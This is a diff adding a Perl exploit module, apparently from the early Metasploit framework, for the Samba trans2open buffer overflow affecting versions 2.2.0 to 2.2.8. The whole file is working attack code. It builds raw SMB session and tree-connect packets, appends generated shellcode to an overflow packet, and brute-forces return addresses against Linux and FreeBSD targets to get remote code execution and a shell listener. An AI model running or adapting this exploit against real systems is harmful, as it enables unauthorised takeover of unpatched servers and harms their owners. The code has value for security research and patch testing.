@@ -1,0 +1,224 @@
+use IO::Socket;
+use IO::Select;
+
+use Pex;
+
+##
+#
+$Name = "Samba trans2open Overflow";
+$Version = "1.0";
+$Author = "H D Moore";
+$URL = "http://www.metasploit.com";
+$Group = "Samba";
+$Description = "This exploits the buffer overflow found in Samba versions ".
+               "2.2.0 to 2.2.8. This particular module is capable of exploiting ".
+               "the bug on x86 Linux and FreeBSD systems. Please see the following ".
+               "URL for more information on this vulnerability.\n\n".
+               "http://www.digitaldefense.net/labs/advisories/DDI-1013.txt";
+#
+##
+
+my $pex = Pex->new();
+my $pay = {};
+
+sub Init {
+    my ($obj) = @_;
+    $obj->NeedPayload(1);
+    $obj->Payloads();
+}
+
+sub Payloads {
+    my ($obj, $opt) = @_;
+    my $x = $pex->Payloads();
+    
+    # load all x86 *nix payloads
+    foreach my $os (keys(%{ $x->{"x86"} }))
+    {
+        if ($os !~ /bsd|linux/) { next; }
+        foreach my $name (keys(%{ $x->{"x86"}->{$os} }))
+        {
+            my $title = $x->{"x86"}->{$os}->{$name}->{"NAME"};
+            $pay->{$title} = $x->{"x86"}->{$os}->{$name};
+        }
+    }
+
+    return $pay;
+}
+
+sub Check {
+    my ($obj, $opt) = @_;  
+    return "No vulnerability check has been implemented for this module.";
+}
+
+sub Options {
+    my ($obj, $payload) = @_;
+    my $res = {};
+      
+    $res->{"RHOST"} = [1, "The target system's ip address."];
+    $res->{"RPORT"} = [1, "The port that Samba is running on."];
+    $res->{"OS"}    = [1, "The target OS (Linux or FreeBSD)."];    
+    
+    foreach my $popt (keys (%{ $pay->{$payload}->{"ARGS"} }))
+    {
+        $res->{$popt} = $pay->{$payload}->{"ARGS"}->{$popt};
+    }
+    return $res;
+}
+
+sub SetupPayload {
+    my ($opt) = @_;
+
+    my $payload = $pay->{$opt->{"PAYLOAD"}};
+    my (undef, $parch, $pos, $pname) = split(/\_/, $payload->{"METH"});
+    if (! $pname)
+    {
+        print "[*] No such payload exists.\n";
+        return(undef);
+    }
+    
+    print "[*] Generating payload " . $opt->{"PAYLOAD"} . " ($parch, $pos, $pname)...\n";
+    
+    my $shellcode = $pex->EasySC("\x00", 934, $parch, $pos, $pname, $opt);
+
+    if ($shellcode)
+    {
+        print "[*] Payload generation complete (" . length($shellcode) . " bytes)\n";
+    } else {
+        print "[*] Error generating payload: " . $pex->Error() . "\n";
+        return(undef);
+    }
+
+
+    my $listener;
+    my $handler = $payload->{"SHELL"};
+      
+    if ($handler)
+    { 
+        $listener = $pex->$handler($opt);
+        if ($listener == 0) { return undef }
+        return ($shellcode, $listener);
+    }
+    
+    # other payloads fork to maintain compatibility
+    $listener = $$;
+    my $exploit = fork();
+    if (! $exploit) { return ($shellcode, $listener) }
+    while (waitpid($exploit, WNOHANG) == 0) { sleep(1) }
+    return(undef);
+
+}
+
+sub Exploit {
+    my ($obj, $opt) = @_;
+
+    select(STDOUT);$|++;
+
+    my $target_host = $opt->{"RHOST"};
+    my $target_port = $opt->{"RPORT"} || 139;
+    my $target_os   = lc($opt->{"OS"});
+    
+    my %targets =
+    (
+        "linux"     => [0xbfffffdc, 0xbf100000, 512],
+        "freebsd"   => [0xbfbffffc, 0xbf100000, 512],
+        #"solaris"   => [0x08047ffc, 0x08010101, 512],       
+    );
+
+    if (! $targets{$target_os})
+    {
+        print "[*] Error: OS must be set to one of the following: " . join(", ", keys(%targets)) . "\n";
+        return(0);
+    }
+
+    my ($shellcode, $listener) = SetupPayload($opt);
+    if (! defined($shellcode)) { return }
+
+    print "[*] Starting brute force mode...\n";
+    for ( 
+          $curr_ret  = $targets{$target_os}->[0]; 
+          $curr_ret >= $targets{$target_os}->[1];
+          $curr_ret -= $targets{$target_os}->[2]
+        )
+    {
+        select(STDOUT); $|++;
+        if (! AttemptExploit($target_host, $target_port, $target_os, $shellcode, $curr_ret))
+        { last;  }
+    }
+    exit(0);
+}
+
+sub AttemptExploit {
+    my ($target_host, $target_port, $target_os, $shellcode, $curr_ret) = @_;
+    
+    $Ret = pack("l", $curr_ret);
+    $Wri = pack("l", ($curr_ret - 512));
+    
+    my $s = IO::Socket::INET->new
+    (
+        PeerAddr => $target_host, 
+        PeerPort => $target_port,
+        Protocol => "tcp",
+        Type     => SOCK_STREAM
+    );
+    
+    if (! $s)
+    {
+        print "\n[*] Could not connect to target: $!\n";
+        return(0);
+    }
+    
+    select($s); $|++;
+    select(STDOUT); $|++;
+    $pex->UnblockHandle($s);
+    
+    my $SetupSession = 
+    "\x00\x00\x00\x2e\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x08\x00\x00".
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+    "\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01\x00\x00".
+    "\x00\x00";
+
+    my $TreeConnect =
+    "\x00\x00\x00\x3c\xff\x53\x4d\x42\x70\x00\x00\x00\x00\x00\x00\x00".
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00".
+    "\x64\x00\x00\x00\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e".
+    "\x6f\x62\x6f\x64\x79\x00\x00\x00\x00\x00\x00\x00\x49\x50\x43\x24";
+
+    my $Flush = ("\x00" x 810);
+    
+   
+    print $s $SetupSession;
+    $res = ReadResponse($s);
+
+    print $s $TreeConnect;
+    $res = ReadResponse($s);
+
+    my $Overflow =
+    "\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00".
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
+    "\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00".
+    "\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01".
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90";
+    
+    $Overflow .=  $shellcode; # 936 bytes 
+    $Overflow .=  "\x90" x 97;
+    $Overflow .= (($Wri . $Ret) x 4) . ("\x00" x 273);
+    
+    
+    printf ("[*] Trying return address 0x%.8x ($target_$os) [%d bytes]\n", $curr_ret, length($Overflow));
+    print $s $Overflow;
+    print $s $Flush;
+    
+    ReadResponse($s);
+    
+    close($s);
+}
+
+sub ReadResponse {
+    my ($s) = @_;
+    my $sel = IO::Select->new($s);
+    my $res;
+    my @fds = $sel->can_read(4);
+    if (scalar(@fds)) { sysread($s, $res, 2048) }
+    return($res);  
+}
